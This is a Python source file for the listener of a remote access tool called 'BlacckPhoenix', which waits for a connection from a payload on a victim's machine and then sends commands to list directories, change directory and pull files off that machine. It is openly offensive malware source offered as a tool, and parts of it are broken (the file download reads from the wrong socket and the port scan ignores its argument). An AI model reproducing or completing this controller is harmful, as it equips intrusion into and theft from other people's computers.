import socket, os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
host,port=socket.gethostname(),5555

local_addr=socket.gethostbyname(host)
#print(f'{local_addr}')

s.bind((host,port))

s.listen(1)
print('[*] BlacckPhoenix listener initiated listening......')
conn, addr=s.accept()

print(f'got connection from {addr}')

while 1:
	command=input('BlacckPhoenix>>')
	if command=='pcwd':
		conn.send(command.encode())
		pcwd=conn.recv(5000)
		pcwd=pcwd.decode()
		print(pcwd)
	elif command=='ls':
		conn.send(command.encode())
		ls=conn.recv(5000)
		ls=ls.decode()
		print(ls)
	elif command=='cd':
		cd=input('cd to:')
		conn.send(command.encode())
		conn.send(cd.encode())
		#cdr=conn.recv(5000)
		#cdr=cdr.decode()
		#print(f'changed to dir {cdr}')
	elif command=='download_file':
		filename=input('Enter filename:')
		conn.send(command.encode())
		conn.send(filename.encode())
		filedata=s.recv(5000)
		with open(filename,'wb') as newfile:
			newfile.write(filedata)
		print('file downloaded successfully')
	elif command=='scan_port':
		#conn.send(command.encode())
		def scan_port(port_num):
			try:
				s.connect((host,port))
				return True
			except:
				return False
		for p in range(65535):
			if scan_port(p):
				print(p)
	elif command=='help':
		print('''
	pcwd >> shows the current working directory of the payload in the host's machine
	ls >> lists the available directories in the available directory
	cd >> changes to the specified directory
'			''')
	elif command=='exit':
		exit()

















	else:
		print(f'no such command {command}')
